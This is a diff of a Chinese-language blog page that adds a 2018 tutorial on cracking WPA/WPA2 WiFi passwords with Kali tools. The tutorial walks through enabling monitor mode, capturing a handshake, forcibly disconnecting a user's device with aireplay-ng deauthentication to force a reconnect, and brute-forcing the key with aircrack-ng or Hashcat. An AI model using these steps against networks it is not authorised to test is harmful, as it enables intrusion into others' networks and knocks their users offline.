@@ -285,6 +285,166 @@
   <div id="posts" class="posts-expand">
     
 
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/01/利用kali破解wpa-wpa2加密的WIFI（爆破美学）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="FDrag0n">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="从零开始的学习生涯">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/05/01/利用kali破解wpa-wpa2加密的WIFI（爆破美学）/" itemprop="url">利用kali破解wpa/wpa2加密的WIFI（爆破美学）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-01T22:26:38+08:00">2018-05-01</time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/kali/" itemprop="url" rel="index"><span itemprop="name">kali</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+		  
+		  
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="利用kali破解wpa-wpa2加密的WIFI（爆破美学）"><a href="#利用kali破解wpa-wpa2加密的WIFI（爆破美学）" class="headerlink" title="利用kali破解wpa/wpa2加密的WIFI（爆破美学）"></a>利用kali破解wpa/wpa2加密的WIFI（爆破美学）</h1><h2 id="硬件准备阶段："><a href="#硬件准备阶段：" class="headerlink" title="硬件准备阶段："></a>硬件准备阶段：</h2><p>因为用vm安装的kali不支持笔记本内置的无限网卡所以需要购买kali支持的网卡，博主买的是<strong>RT3070L芯片组</strong>的网卡，某宝上面无壳的只要20元，加壳才25元。<br>在kali中必须识别出网卡，使用<strong>ifconfig</strong>查看网卡信息，wlan0为无线网卡。<img src="https://s1.ax1x.com/2018/05/01/CJh0tx.jpg" alt="CJh0tx.jpg"></p>
+<h2 id="攻击准备阶段："><a href="#攻击准备阶段：" class="headerlink" title="攻击准备阶段："></a>攻击准备阶段：</h2><h3 id="开启网卡监听模式："><a href="#开启网卡监听模式：" class="headerlink" title="开启网卡监听模式："></a>开启网卡监听模式：</h3><pre><code>airmon-ng start wlan0
+</code></pre><p>如果成功的话，网卡名称会变成wlan0mon<br><img src="https://s1.ax1x.com/2018/05/01/CJhwA1.jpg" alt="CJhwA1.jpg"></p>
+<h3 id="扫描热点："><a href="#扫描热点：" class="headerlink" title="扫描热点："></a>扫描热点：</h3><pre><code>airodump-ng wlan0mon
+</code></pre><p>可以看到如图信息[<img src="https://s1.ax1x.com/2018/05/01/CJha7R.md.jpg" alt="CJha7R.md.jpg"></p>
+<h3 id="抓握手包："><a href="#抓握手包：" class="headerlink" title="抓握手包："></a>抓握手包：</h3><p>c代表信道，bssid为mac地址，w参数指的是抓到的包放的目录以及包的名字。</p>
+<pre><code>airodump-ng wlan0mon -c 4 --bssid XX:XX:XX:XX -w /root
+
+-c 选择信道，对应上图CH
+--bssid 需要破解的wifi的mac地址
+-w cap文件名及路径
+wlan0mon 启用监听模式的网卡名
+</code></pre><p>当有人连接时就能抓到握手包。<img src="https://s1.ax1x.com/2018/05/01/CJhUB9.jpg" alt="CJhUB9.jpg"></p>
+<h4 id="如果对面都在使用wifi，没人连接怎么办？"><a href="#如果对面都在使用wifi，没人连接怎么办？" class="headerlink" title="如果对面都在使用wifi，没人连接怎么办？"></a>如果对面都在使用wifi，没人连接怎么办？</h4><p>通过以下命令断开设备与WiFi的连接</p>
+<pre><code>aireplay-ng -0 20 -a A8:6B:7C:19:9F:D0 -c 4C:49:E3:D8:FD:7F wlan0mon
+
+-0 death（强制下线模式），20为执行次数
+-c 被断网的客户机MAC
+-a WIFI热点的mac
+</code></pre><p>抓包成功后白圈出现信息。<br><img src="https://s1.ax1x.com/2018/05/01/CJhUB9.jpg" alt="CJhUB9.jpg"></p>
+<h3 id="爆破："><a href="#爆破：" class="headerlink" title="爆破："></a>爆破：</h3><h4 id="kali："><a href="#kali：" class="headerlink" title="kali："></a>kali：</h4><p>利用aircrack-ng命令</p>
+<pre><code>aircrack-ng -w 字典 握手包
+</code></pre><p>cpu跑这个破解速度有些慢。</p>
+<h4 id="windows："><a href="#windows：" class="headerlink" title="windows："></a>windows：</h4><h5 id="神器1："><a href="#神器1：" class="headerlink" title="神器1："></a>神器1：</h5><p>EWSA，然而7.x版本虽然支持gpu加速，然而没有破解版软件，只能查看密码前两位，收费299$(贵死人)</p>
+<h5 id="神器2："><a href="#神器2：" class="headerlink" title="神器2："></a>神器2：</h5><p>oclHashcat，使用方法有些复杂，是一个win下面的使用命令行的工具，破解速度十分可观。<br>有国人开发了中文版的UI，减少了使用成本，链接：<a href="https://www.iteknical.com/hashcat-gui-cn/" target="_blank" rel="noopener">HashcatGUI_cn – HashcatGUI 中文版</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
 
 
     <div class="post-spread">
@@ -462,7 +622,7 @@
 
 
 <div>
-<script async src="js/src/js.js"></script>
+<script async src="/js/src/js.js"></script>
 <span id="busuanzi_container_site_pv" style="display:none">
     本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
     <span class="post-meta-divider">|</span>
